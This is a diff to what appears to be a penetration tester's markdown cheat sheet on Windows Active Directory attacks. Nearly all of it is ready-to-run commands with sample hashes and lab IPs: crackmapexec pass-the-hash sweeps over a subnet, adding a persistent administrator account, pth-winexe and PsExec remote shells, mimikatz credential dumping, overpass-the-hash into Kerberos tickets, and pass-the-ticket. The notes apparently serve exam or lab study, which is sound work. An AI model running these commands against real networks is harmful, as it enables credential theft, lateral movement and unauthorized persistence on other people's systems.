@@ -15,6 +15,7 @@ Second, detect if the SMB signing is disabled. When SMB signing is disabled, an 
 - create new user for persistence(in case ippsec change pw): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net user /add admin Password12345'`
 - add user to localgroup: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net local group administrators'`
 - attempt to authenticate each machine in the subnet with the username and hash provided: `crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local`
+- example: `crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local`
 - NOTE: #--local: This flag specifies that you're attempting to authenticate against local accounts on the target machine, rather than domain accounts.
 
 
@@ -384,48 +385,38 @@ crackmapexec winrm 192.168.1.50 -u s4vitar -H ffffffffffffffffffffffff -X 'whoam
 crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'whoami'
 ```
 
+- Remote Access - winexe
 ```
-
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd.exe
 ```
-
-- find which account can the hash access 
-```
-crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
-```
-
-
-
-
-
-
-
 
 
 ## Over Pass the Hash
 
-- Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
+Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket (TGS), which grants us access to another machine or service as that user
 
+- obtain NTLM hash of current user in current context e.g. running notepad as Jen
 ```
-mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
 ```
 
-- Command execution with psexec  
+- Create new PowerShell as Jen (hash owner) to obtain Kerberos tickets without performing NTLM authentication over the network (output: launch a new powershell as Jen
+```
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+```
+
+- if klist finds no cached TGT and TGS, we generate TGT using cache hashes by invoking
+```
+net use \\files04
+```
+
+- Once klist returns a krbtgt, then the NTLM has been converted into kerberos TGT
 ```
 .\PsExec.exe \\<hostname> cmd.exe
+.\PsExec.exe \\files04 cmd
 ```
 
-### Overpass the hash (convert NTLM hash into a Kerberos TGT, then use TGT to obtain TGS)
-```bash
-#output is a kerberos ticket
-mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
-
-# Checking if the forged tickets is in memory
-ps> klist
-
-#get shell
-psexec.exe -accepteula \\<remote_hostname> cmd  
-```
 
 
 
@@ -691,7 +682,7 @@ mimikatz # misc::cmd whoami
 2. Export .kirbi file (with latest timestamp) to the working directory folder: `export Kirsekurlsa::tickets /export` or `Invoke-Mimikatz -Command '"Mimikatz::debug" "sekurlsa::tickets /export" "exit"'`
 3. Finds the newly exported file int he working directory folder: `dir *.kirbi`
 4. Pass the ticket: `mimikatz # kerberos::ptt *[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi*` or `invoke-mimikatz -Command '"Mimikatz::debug "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi" "exit"'
-5. To list and show all the tickets that you have: `klist`**
+5. To list and show all the cached TGT and TGS tickets that you have: `klist`**
 
 ## Silver ticket
 - Exploitation mimikatz.exe
